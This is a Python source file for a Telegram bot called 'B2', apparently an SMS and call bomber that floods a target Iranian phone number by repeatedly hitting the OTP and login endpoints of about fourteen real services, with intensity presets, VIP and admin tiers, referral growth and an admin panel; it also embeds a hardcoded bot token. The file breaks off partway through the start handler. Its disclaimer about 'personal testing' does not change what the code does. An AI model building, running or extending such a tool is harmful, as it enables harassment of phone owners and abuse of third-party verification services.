# app.py
# -*- coding: utf-8 -*-
"""
B2 Bot — SMS / Call bomber with VIP & Admin panel.
Written with love.
"""

import asyncio
import hashlib
import json
import logging
import os
import random
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Any

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.enums import ParseMode, ChatAction
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove,
    BotCommand, BotCommandScopeDefault
)


# ============================================================
#                    COLORS
# ============================================================
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"
    BRED = "\033[91m"; BGREEN = "\033[92m"; BYELLOW = "\033[93m"
    BBLUE = "\033[94m"; BMAGENTA = "\033[95m"; BCYAN = "\033[96m"; BWHITE = "\033[97m"
    BBLACK = "\033[90m"
    BG_RED = "\033[41m"


if os.name == "nt":
    os.system("")


class Fmt(logging.Formatter):
    LC = {"DEBUG": C.BBLACK, "INFO": C.BCYAN, "WARNING": C.BYELLOW,
          "ERROR": C.BRED, "CRITICAL": C.BG_RED + C.BWHITE + C.BOLD}
    LI = {"DEBUG": "·", "INFO": "i", "WARNING": "!", "ERROR": "x", "CRITICAL": "X"}

    def format(self, r):
        c = self.LC.get(r.levelname, C.RESET)
        i = self.LI.get(r.levelname, "·")
        ts = datetime.fromtimestamp(r.created).strftime("%H:%M:%S")
        return (f"{C.BBLACK}[{ts}]{C.RESET} "
                f"{c}{i} {r.levelname:<8}{C.RESET} "
                f"{C.BMAGENTA}{r.name}{C.RESET} "
                f"{C.DIM}>{C.RESET} {c}{r.getMessage()}{C.RESET}")


def setup_logger():
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    for h in root.handlers[:]:
        root.removeHandler(h)
    h = logging.StreamHandler(sys.stdout)
    h.setFormatter(Fmt())
    root.addHandler(h)
    for n in ("aiogram", "aiohttp", "asyncio"):
        logging.getLogger(n).setLevel(logging.WARNING)
    return logging.getLogger("B2")


log = setup_logger()


def banner():
    print(f"""
{C.BCYAN}{C.BOLD}
  ██████╗ ██████╗ 
  ██╔══██╗╚════██╗
  ██████╔╝ █████╔╝
  ██╔══██╗ ╚═══██╗
  ██████╔╝██████╔╝
  ╚═════╝ ╚═════╝ 
{C.RESET}
{C.BCYAN}      B2 Bot is starting...{C.RESET}
{C.BBLACK}   ────────────────────────────{C.RESET}
""")


# ============================================================
#                    CONFIG
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8970854395:AAGAL3KW9SpDskkwmsNFNF4FEpbF3jEDsXM").strip()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8094551428").split(",") if x.strip().isdigit()]
PROXY_URL = os.getenv("PROXY_URL", "").strip() or None

DATA_DIR = Path(os.getenv("DATA_DIR", "data"))
DATA_DIR.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
JOBS_FILE = DATA_DIR / "jobs.json"
STATS_FILE = DATA_DIR / "stats.json"
CONFIG_FILE = DATA_DIR / "config.json"
BACKUP_DIR = DATA_DIR / "backups"
BACKUP_DIR.mkdir(exist_ok=True)

MAX_PER_JOB = 1000
MAX_PER_JOB_ADMIN = 10000
RATE_LIMIT = 15
RATE_LIMIT_VIP = 5
VIP_REQUIRED = 10

BOT_NAME = "B2"

INTENSITY = {
    "normal": {"delay": 0.6, "concurrency": 10, "label": "نرمال", "emoji": "🟢"},
    "hard":   {"delay": 0.3, "concurrency": 20, "label": "سنگین", "emoji": "🟡"},
    "rage":   {"delay": 0.1, "concurrency": 50, "label": "رگباری", "emoji": "🔴"},
}


# ============================================================
#                    FILTER
# ============================================================
def _hash(phone: str) -> str:
    return hashlib.sha256(f"B2::{phone}".encode()).hexdigest()[:16]


_FORBIDDEN = {_hash("09058307549"), _hash("09300961521")}


# ============================================================
#                    DATABASE
# ============================================================
class DB:
    def __init__(self):
        self._lock = asyncio.Lock()
        self.users: dict = {}
        self.jobs: dict = {}
        self.stats: dict = {
            "total_users": 0, "total_jobs": 0,
            "total_success": 0, "total_failed": 0,
            "blocked_attempts": 0, "vip_count": 0, "admin_jobs": 0,
        }
        self.config: dict = {
            "force_join_enabled": False,
            "force_join_channel": "",
            "force_join_channel_id": 0,
            "force_join_link": "",
            "bot_username": "",
            "maintenance": False,
        }
        self._load()

    def _load(self):
        self.users = self._read(USERS_FILE, {})
        self.jobs = self._read(JOBS_FILE, {})
        self.stats = {**self.stats, **self._read(STATS_FILE, {})}
        self.config = {**self.config, **self._read(CONFIG_FILE, {})}
        log.info(f"DB loaded: {len(self.users)} users, {len(self.jobs)} jobs")

    @staticmethod
    def _read(p: Path, d: Any) -> Any:
        if not p.exists():
            return d
        try:
            with open(p, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            log.warning(f"read {p}: {e}")
            return d

    @staticmethod
    def _write(p: Path, d: Any):
        tmp = p.with_suffix(p.suffix + ".tmp")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, ensure_ascii=False, indent=2)
        os.replace(tmp, p)

    async def _save(self, which: str):
        async with self._lock:
            if which == "users":
                self._write(USERS_FILE, self.users)
            elif which == "jobs":
                self._write(JOBS_FILE, self.jobs)
            elif which == "stats":
                self._write(STATS_FILE, self.stats)
            elif which == "config":
                self._write(CONFIG_FILE, self.config)

    async def get_or_create(self, tg, referrer_id: int = 0):
        uid = str(tg.id)
        u = self.users.get(uid)
        is_new = False
        if not u:
            is_new = True
            u = {
                "user_id": tg.id,
                "username": tg.username or "",
                "first_name": tg.first_name or "",
                "joined_at": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "is_banned": False,
                "rules_accepted": False,
                "is_vip": False,
                "vip_since": None,
                "invited_by": referrer_id if referrer_id and referrer_id != tg.id else 0,
                "invite_count": 0,
                "invited_users": [],
                "total_jobs": 0, "total_success": 0, "total_failed": 0,
                "rage_uses": 0,
            }
            self.users[uid] = u
            self.stats["total_users"] = self.stats.get("total_users", 0) + 1
            await self._save("users")
            await self._save("stats")
            log.info(f"new user: {tg.first_name} (@{tg.username}) - {tg.id}")

            if referrer_id and referrer_id != tg.id:
                ref = self.users.get(str(referrer_id))
                if ref and not ref.get("is_banned"):
                    ref["invite_count"] = ref.get("invite_count", 0) + 1
                    ref.setdefault("invited_users", []).append(tg.id)
                    await self._save("users")
                    log.info(f"{ref.get('first_name')} invited {tg.first_name}")
        else:
            u["last_seen"] = datetime.now().isoformat()
        return u, is_new

    def get(self, uid: int) -> Optional[dict]:
        return self.users.get(str(uid))

    def is_banned(self, uid: int) -> bool:
        u = self.users.get(str(uid))
        return bool(u and u.get("is_banned"))

    def has_rules(self, uid: int) -> bool:
        u = self.users.get(str(uid))
        return bool(u and u.get("rules_accepted"))

    def is_vip(self, uid: int) -> bool:
        u = self.users.get(str(uid))
        return bool(u and u.get("is_vip"))

    def invite_count(self, uid: int) -> int:
        u = self.users.get(str(uid))
        return int(u.get("invite_count", 0)) if u else 0

    async def accept_rules(self, uid: int):
        if (u := self.users.get(str(uid))):
            u["rules_accepted"] = True
            await self._save("users")

    async def set_banned(self, uid: int, banned: bool) -> bool:
        if not (u := self.users.get(str(uid))):
            return False
        u["is_banned"] = banned
        await self._save("users")
        return True

    async def set_vip(self, uid: int, vip: bool = True) -> bool:
        u = self.users.get(str(uid))
        if not u:
            return False
        was_vip = u.get("is_vip", False)
        u["is_vip"] = vip
        u["vip_since"] = datetime.now().isoformat() if vip else None
        if vip and not was_vip:
            self.stats["vip_count"] = self.stats.get("vip_count", 0) + 1
            await self._save("stats")
        elif not vip and was_vip:
            self.stats["vip_count"] = max(0, self.stats.get("vip_count", 0) - 1)
            await self._save("stats")
        await self._save("users")
        return True

    def all_ids(self) -> list:
        return [int(k) for k in self.users.keys()]

    def user_stats(self, uid: int) -> dict:
        u = self.users.get(str(uid)) or {}
        return {
            "jobs": u.get("total_jobs", 0),
            "success": u.get("total_success", 0),
            "failed": u.get("total_failed", 0),
            "rage": u.get("rage_uses", 0),
            "invites": u.get("invite_count", 0),
            "is_vip": u.get("is_vip", False),
        }

    async def create_job(self, uid, phone, mode, count, intensity="normal", is_admin_job=False) -> str:
        jid = f"{int(time.time()*1000)}-{random.randint(1000,9999)}"
        self.jobs[jid] = {
            "id": jid, "user_id": uid, "phone": phone, "mode": mode,
            "intensity": intensity, "is_admin": is_admin_job,
            "count": count, "success": 0, "failed": 0, "rounds": 0,
            "status": "running",
            "started_at": datetime.now().isoformat(),
            "finished_at": None,
        }
        self.stats["total_jobs"] = self.stats.get("total_jobs", 0) + 1
        if is_admin_job:
            self.stats["admin_jobs"] = self.stats.get("admin_jobs", 0) + 1
        await self._save("jobs")
        await self._save("stats")
        log.info(f"job #{jid[-8:]} | {phone} | {mode}/{intensity} | x{count}")
        return jid

    async def finish_job(self, jid, success, failed, rounds, status):
        j = self.jobs.get(jid)
        if not j:
            return
        j.update({
            "success": success, "failed": failed,
            "rounds": rounds, "status": status,
            "finished_at": datetime.now().isoformat(),
        })
        if (u := self.users.get(str(j["user_id"]))):
            u["total_jobs"] = u.get("total_jobs", 0) + 1
            u["total_success"] = u.get("total_success", 0) + success
            u["total_failed"] = u.get("total_failed", 0) + failed
        self.stats["total_success"] = self.stats.get("total_success", 0) + success
        self.stats["total_failed"] = self.stats.get("total_failed", 0) + failed
        await self._save("jobs")
        await self._save("users")
        await self._save("stats")
        log.info(f"job #{jid[-8:]} {status} | ok:{success} fail:{failed}")

    async def inc_rage(self, uid: int):
        if (u := self.users.get(str(uid))):
            u["rage_uses"] = u.get("rage_uses", 0) + 1
            await self._save("users")

    async def log_blocked(self, uid: int):
        self.stats["blocked_attempts"] = self.stats.get("blocked_attempts", 0) + 1
        await self._save("stats")
        log.warning(f"blocked attempt by {uid}")

    async def set_config(self, **kw):
        self.config.update(kw)
        await self._save("config")

    async def delete_user(self, uid: int) -> bool:
        if str(uid) in self.users:
            del self.users[str(uid)]
            self.stats["total_users"] = max(0, self.stats.get("total_users", 1) - 1)
            await self._save("users")
            await self._save("stats")
            return True
        return False


database = DB()


# ============================================================
#                    BUTTON BUILDERS
# ============================================================
def _btn(text, cb=None, url=None, style="primary"):
    """Build inline button with color style."""
    kwargs = {"text": text}
    if url:
        kwargs["url"] = url
    else:
        kwargs["callback_data"] = cb or "noop"
    try:
        kwargs["style"] = style
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        kwargs.pop("style", None)
        icon = {"primary": "🔵", "success": "🟢", "danger": "🔴"}.get(style, "")
        if icon and not text.startswith(icon):
            kwargs["text"] = f"{icon} {text}"
        return InlineKeyboardButton(**kwargs)


def bp(text, cb=None, url=None):
    return _btn(text, cb, url, "primary")


def bs(text, cb=None, url=None):
    return _btn(text, cb, url, "success")


def bd(text, cb=None, url=None):
    return _btn(text, cb, url, "danger")


# ============================================================
#                    HTTP SERVICES
# ============================================================
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",
]
T = aiohttp.ClientTimeout(total=10)


def ua():
    return random.choice(UA)


def norm(p: str) -> str:
    p = p.strip().replace(" ", "").replace("-", "")
    if p.startswith("+98"): p = "0" + p[3:]
    elif p.startswith("0098"): p = "0" + p[4:]
    elif p.startswith("98") and len(p) == 12: p = "0" + p[2:]
    elif p.startswith("9") and len(p) == 10: p = "0" + p
    return p


def valid_phone(p: str) -> bool:
    p = norm(p)
    return len(p) == 11 and p.startswith("09") and p.isdigit()


def is_forbidden(p: str) -> bool:
    return _hash(norm(p)) in _FORBIDDEN


async def sms_shabdiz(s, p, call=False):
    try:
        async with s.get("https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode",
                         params={"phoneNumber": p},
                         headers={"User-Agent": ua(), "Accept": "*/*",
                                  "Referer": "https://www.shabdizgroup.com/",
                                  "Origin": "https://www.shabdizgroup.com"},
                         timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_digikala(s, p, call=False):
    try:
        async with s.post("https://api.digikala.com/v1/user/authenticate/",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://www.digikala.com/",
                                   "Origin": "https://www.digikala.com"},
                          json={"backUrl": "/", "username": p, "otp_call": call},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_tetherland(s, p, call=False):
    try:
        async with s.post("https://service.tetherland.com/api/v5/login-register",
                          headers={"User-Agent": ua(), "Accept": "application/json",
                                   "Content-Type": "application/json",
                                   "Referer": "https://app.tetherland.com/",
                                   "Origin": "https://app.tetherland.com"},
                          json={"mobile": p,
                                "device_info": {"brand": "", "model": "", "browserVersion": "134.0",
                                                "app_version": "", "by": "web", "osName": "Windows",
                                                "osVersion": "10", "browserName": "Chrome",
                                                "platform": "web", "name": "PC", "device": "web"},
                                "otp_type": "call" if call else "sms", "device": "web"},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_namava(s, p, call=False):
    try:
        async with s.post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json;charset=utf-8",
                                   "X-Application-Type": "WebClient", "X-Client-Version": "2.64.0",
                                   "Origin": "https://www.namava.ir",
                                   "Referer": "https://www.namava.ir/auth/register-phone"},
                          json={"UserName": "+98" + p[1:]},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_shab(s, p, call=False):
    try:
        async with s.post("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json;charset=UTF-8",
                                   "Referer": "https://www.shab.ir/",
                                   "Platform": "web", "Shab-App": "web",
                                   "Origin": "https://www.shab.ir"},
                          json={"mobile": p, "country_code": "+98"},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_azkivam(s, p, call=False):
    try:
        async with s.post("https://api.azkivam.com/auth/login",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://azkivam.com/", "Origin": "https://azkivam.com"},
                          json={"mobileNumber": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_mohit(s, p, call=False):
    try:
        async with s.post("https://api.mohit.online/api/auth/login",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://mohit.online/", "Origin": "https://mohit.online"},
                          json={"username": p, "app": "market"}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_melico(s, p, call=False):
    try:
        async with s.post("https://melico.ir/auth/check-user",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://my.melico.ir/", "Origin": "https://my.melico.ir"},
                          json={"username": p, "group": "my", "recaptcha_token": "abcd"},
                          timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_balad(s, p, call=False):
    try:
        async with s.post("https://account.api.balad.ir/api/web/auth/login/",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "device-id": "664f06ae-f2f1-457c-ade1-3461da43cd77",
                                   "Origin": "https://balad.ir", "Referer": "https://balad.ir/"},
                          json={"phone_number": p, "os_type": "W"}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_tapsi(s, p, call=False):
    try:
        async with s.post("https://api.tapsi.food/v1/api/Authentication/otp",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Referer": "https://tapsi.food/",
                                   "x-platform": "desktop", "x-app-version": "v1.2.09-prd",
                                   "Origin": "https://tapsi.food"},
                          json={"cellPhone": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_divar(s, p, call=False):
    try:
        async with s.post("https://api.divar.ir/v5/auth/authenticate",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/x-www-form-urlencoded",
                                   "Referer": "https://divar.ir/", "Origin": "https://divar.ir"},
                          data=f'{{"phone":"{p}"}}', timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_dgshahr(s, p, call=False):
    try:
        async with s.post("https://lend-b.dgshahr.com/user/login/",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Origin": "https://lend.dgshahr.com",
                                   "Referer": "https://lend.dgshahr.com/"},
                          json={"phone_number": p, "source": "bing-organic"}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_banimode(s, p, call=False):
    try:
        async with s.post("https://mobapi.banimode.com/api/v2/auth/request",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json;charset=utf-8",
                                   "platform": "web", "Origin": "https://www.banimode.com",
                                   "Referer": "https://www.banimode.com/"},
                          json={"phone": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


async def sms_ibime(s, p, call=False):
    try:
        async with s.post("https://api.ibime.com/web/v1/account/otp",
                          headers={"User-Agent": ua(), "Accept": "application/json, text/plain, */*",
                                   "Content-Type": "application/json",
                                   "Origin": "https://ibime.com", "Referer": "https://ibime.com/"},
                          json={"phoneNumber": p}, timeout=T) as r:
            return r.status == 200
    except Exception:
        return False


SMS = [
    ("Shabdiz", sms_shabdiz), ("Digikala", sms_digikala), ("Tetherland", sms_tetherland),
    ("Namava", sms_namava), ("Shab", sms_shab), ("Azkivam", sms_azkivam),
    ("Mohit", sms_mohit), ("Melico", sms_melico), ("Balad", sms_balad),
    ("TapsiFood", sms_tapsi), ("Divar", sms_divar), ("DGShahr", sms_dgshahr),
    ("Banimode", sms_banimode), ("iBime", sms_ibime),
]
CALL = [("Digikala-Call", sms_digikala), ("Tetherland-Call", sms_tetherland)]


# ============================================================
#                    BOMB RUNNER
# ============================================================
class BombRunner:
    def __init__(self, phone, count, mode, jid="", intensity="normal",
                 is_vip=False, is_admin=False, on_progress=None):
        self.phone = phone
        self.count = count
        self.mode = mode
        self.job_id = jid
        self.intensity = intensity
        self.is_vip = is_vip
        self.is_admin = is_admin
        preset = INTENSITY.get(intensity, INTENSITY["normal"])
        self.delay = preset["delay"]
        self.concurrency = preset["concurrency"]
        if is_vip and not is_admin:
            self.concurrency = int(self.concurrency * 1.5)
            self.delay = max(0.05, self.delay * 0.7)
        if is_admin:
            self.concurrency = int(self.concurrency * 2)
            self.delay = max(0.02, self.delay * 0.5)
        self.on_progress = on_progress
        self.stop_flag = False
        self.success = 0
        self.failed = 0
        self.rounds = 0
        self._t0 = time.time()
        self._sem = asyncio.Semaphore(self.concurrency)

    def stop(self):
        self.stop_flag = True

    async def _run_one(self, session, name, func, call=False):
        async with self._sem:
            if self.stop_flag:
                return
            try:
                ok = await func(session, self.phone, call)
            except Exception:
                ok = False
            if ok:
                self.success += 1
            else:
                self.failed += 1

    async def run(self):
        if self.mode == "sms":
            services = [(n, f, False) for n, f in SMS]
        elif self.mode == "call":
            services = [(n, f, True) for n, f in CALL]
        else:
            services = ([(n, f, False) for n, f in SMS] +
                        [(n, f, True) for n, f in CALL])

        log.info(f"start #{self.job_id[-8:]} | {len(services)} svc | "
                 f"{self.count} rounds | {self.intensity}")

        conn = aiohttp.TCPConnector(limit=self.concurrency * 2, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            for r in range(self.count):
                if self.stop_flag:
                    log.warning(f"stopped #{self.job_id[-8:]}")
                    break
                self.rounds = r + 1
                tasks = [asyncio.create_task(self._run_one(session, n, f, c))
                         for n, f, c in services]
                await asyncio.gather(*tasks, return_exceptions=True)
                if self.on_progress:
                    try:
                        await self.on_progress(self.rounds, self.count,
                                               self.success, self.failed)
                    except Exception:
                        pass
                if self.stop_flag:
                    break
                await asyncio.sleep(self.delay)
        log.info(f"done #{self.job_id[-8:]} in {round(time.time()-self._t0,1)}s")
        return {"rounds": self.rounds, "success": self.success,
                "failed": self.failed, "stopped": self.stop_flag}


# ============================================================
#                    STATES
# ============================================================
class S(StatesGroup):
    rules = State()
    join = State()
    menu = State()
    phone = State()
    count = State()
    intensity = State()
    admin_msg_user = State()
    admin_search = State()
    post_text = State()
    post_button_url = State()
    admin_broadcast_text = State()
    set_channel = State()


ACTIVE: dict = {}
LAST_JOB: dict = {}


# ============================================================
#                    RULES TEXT
# ============================================================
RULES_TEXT = (
    "📜 <b>قوانین استفاده</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━\n\n"
    "سلام رفیق! قبل از شروع، این چند خط رو بخون:\n\n"
    "• این ربات برای <b>آموزش و تست شخصی</b> ساخته شده.\n\n"
    "• اگه روی شماره‌ی خودت تست کنی، هیچی نیست. ولی اگه روی شماره‌ی دیگران بدون اجازه بزنی، <b>کل مسئولیتش با خودته</b>.\n\n"
    "• ما هیچ مسئولیتی در قبال استفاده‌ی اشتباه نداریم.\n\n"
    "• سیستم فیلتر فعاله. اگه سعی کنی دورش بزنی، <b>بن دائمی</b> می‌شی.\n\n"
    "• مزاحمت برای دیگران کار درستی نیست و پیگرد قانونی داره.\n\n"
    "━━━━━━━━━━━━━━━━━━━━━\n"
    "اگه با این شرایط موافقی، روی دکمه‌ی <b>سبز</b> بزن تا بریم جلو.\n"
    "در غیر این صورت، بهتره ربات رو ببندی."
)


# ============================================================
#                    REPLY KEYBOARDS (Simple & Clean)
# ============================================================
def kb_user_menu() -> ReplyKeyboardMarkup:
    """منوی کاربر عادی — ساده و تمیز"""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📩 بمبر پیامک"), KeyboardButton(text="📞 بمبر تماس")],
            [KeyboardButton(text="🔥 بمبر ترکیبی"), KeyboardButton(text="⚡ رگباری")],
            [KeyboardButton(text="💎 پنل VIP"), KeyboardButton(text="🎁 دعوت دوستان")],
            [KeyboardButton(text="📊 آمار من"), KeyboardButton(text="🌐 آمار کلی")],
            [KeyboardButton(text="📖 راهنما"), KeyboardButton(text="📜 قوانین")],
        ],
        resize_keyboard=True,
        is_persistent=False,
        one_time_keyboard=False,
        input_field_placeholder="یه گزینه انتخاب کن...",
    )


def kb_admin_menu() -> ReplyKeyboardMarkup:
    """منوی ادمین — ساده و تمیز"""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📩 بمبر پیامک"), KeyboardButton(text="📞 بمبر تماس")],
            [KeyboardButton(text="🔥 بمبر ترکیبی"), KeyboardButton(text="⚡ رگباری")],
            [KeyboardButton(text="👑 پنل ادمین"), KeyboardButton(text="📊 آمار لحظه‌ای")],
            [KeyboardButton(text="👥 کاربران"), KeyboardButton(text="📦 جاب‌های فعال")],
            [KeyboardButton(text="📢 پیام همگانی"), KeyboardButton(text="🎛 تنظیمات")],
            [KeyboardButton(text="📖 راهنما"), KeyboardButton(text="📜 قوانین")],
        ],
        resize_keyboard=True,
        is_persistent=False,
        one_time_keyboard=False,
        input_field_placeholder="پنل ادمین...",
    )


def kb_cancel() -> ReplyKeyboardMarkup:
    """دکمه‌ی لغو — یکبار مصرف"""
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="❌ لغو عملیات")]],
        resize_keyboard=True,
        one_time_keyboard=True,
        input_field_placeholder="برای لغو کلیک کن...",
    )


# ============================================================
#                    INLINE KEYBOARDS (Colored)
# ============================================================
def kb_rules() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [bs("قوانین رو می‌پذیرم", "accept_rules")],
        [bd("نمی‌پذیرم", "reject_rules")],
    ])


def kb_join(link: str) -> InlineKeyboardMarkup:
    rows = []
    if link:
        rows.append([bp("عضویت در کانال", url=link)])
    rows.append([bs("عضو شدم", "check_join")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_stop(jid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [bd("توقف", f"stop:{jid}"), bp("وضعیت", f"status:{jid}")],
    ])


def kb_intensity() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [bs("نرمال — سرعت معمولی", "int:normal")],
        [bp("سنگین — سرعت بالا", "int:hard")],
        [bd("رگباری — حداکثر قدرت", "int:rage")],
        [bd("لغو", "int:cancel")],
    ])


def kb_admin_panel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [bp("داشبورد زنده", "ad:dashboard"),
         bp("آمار تفصیلی", "ad:stats")],
        [bp("مدیریت کاربران", "ad:users"),
         bp("مدیریت VIP", "ad:vip")],
        [bp("بن‌لیست", "ad:banned"),
         bp("جاب‌های فعال", "ad:active")],
        [bs("پیام همگانی", "ad:broadcast")],
        [bp("ارسال پست به کانال", "ad:post")],
        [bp("آمار دعوت‌ها", "ad:invites")],
        [bp("جستجوی کاربر", "ad:search")],
        [bp("تنظیمات", "ad:settings"),
         bp("مدیریت کانال", "ad:channel")],
        [bp("پشتیبان‌گیری", "ad:backup"),
         bp("پاک‌سازی", "ad:cleanup")],
        [bd("بازگشت به منو", "ad:back_menu")],
    ])


def kb_admin_settings() -> InlineKeyboardMarkup:
    cfg = database.config
    join = "🟢" if cfg.get("force_join_enabled") else "🔴"
    maint = "🟢" if cfg.get("maintenance") else "🔴"
    return InlineKeyboardMarkup(inline_keyboard=[
        [bp(f"{join} عضویت اجباری", "ad:toggle_join")],
        [bp(f"{maint} حالت تعمیر", "ad:toggle_maint")],
        [bp("لینک کانال", "ad:set_link")],
        [bp("اطلاعات ربات", "ad:bot_info")],
        [bd("بازگشت", "ad:panel")],
    ])


def kb_user_manage(uid: int, banned: bool, is_vip: bool) -> InlineKeyboardMarkup:
    rows = []
    if banned:
        rows.append([bs("آنبن کن", f"unban:{uid}")])
    else:
        rows.append([bd("بن کن", f"ban:{uid}")])
    if is_vip:
        rows.append([bd("حذف VIP", f"unvip:{uid}")])
    else:
        rows.append([bs("بده VIP", f"givevip:{uid}")])
    rows.append([bp("ارسال پیام", f"msg:{uid}")])
    rows.append([bd("حذف کاربر", f"del:{uid}")])
    rows.append([bp("بازگشت", "ad:users")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ============================================================
#                    HELPERS
# ============================================================
async def check_membership(bot: Bot, uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    cfg = database.config
    if not cfg.get("force_join_enabled"):
        return True
    ch_id = cfg.get("force_join_channel_id", 0)
    if not ch_id:
        return True
    try:
        m = await bot.get_chat_member(ch_id, uid)
        return m.status in ("member", "administrator", "creator")
    except TelegramBadRequest as e:
        log.warning(f"membership: {e}")
        return False
    except Exception as e:
        log.warning(f"membership error: {e}")
        return False


def progress_bar(pct: int, length: int = 10) -> str:
    filled = int(pct * length / 100)
    return "█" * filled + "░" * (length - filled)


def get_bot_link(bot_username: str, uid: int) -> str:
    return f"https://t.me/{bot_username}?start=ref_{uid}"


def fmt_num(n: int) -> str:
    return f"{n:,}"


def fmt_date(iso: str) -> str:
    if not iso:
        return "-"
    try:
        return iso[:10]
    except Exception:
        return "-"


# ============================================================
#                    ROUTER
# ============================================================
router = Router()


# ============================================================
#                    /start
# ============================================================
@router.message(CommandStart())
async def cmd_start(m: Message, state: FSMContext):
    args = m.text.split() if m.text else []
    referrer_id = 0
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referrer_id = int(args[1][4:])
        except ValueError:
            referrer_id = 0

    u, is_new = await database.get_or_create(m.from_user, referrer_id)

    if u.get("is_banned"):
        await m.answer("متأسفانه دسترسی شما مسدود شده.")
        await state.clear()
        return

    # Rules for everyone (first time)
    if not u.get("rules_accepted"):
        await m.answer(
            f"سلام <b>{m.from_user.first_name}</b> 👋\n\n"
            f"به <b>B2</b> خوش اومدی.\n\n"
            f"قبل از شروع، یه نگاهی به قوانین بنداز:\n\n"
            f"{RULES_TEXT}",
            reply_markup=kb_rules(),
        )
        await state.set_state(S.rules)
        return

    is_admin = m.from_user.id in ADMIN_IDS

    # Admin — direct access
    if is_admin:
        await m.answer(
            f"سلام <b>{m.from_user.first_name}</b> 👑\n\n"
            f"خوش برگشتی.\n\n"
            f"دسترسی کامل و بدون محدودیت برات فعاله.\n\n"
            f"از منوی زیر انتخاب کن:",
            reply_markup=kb_admin_menu(),
        )
        await state.set_state(S.menu)
        return

    # Regular — check membership
    if not await check_membership(m.bot, m.from_user.id):
        cfg = database.config
        await m.answer(
            "<b>یه قدم مونده!</b>\n\n"
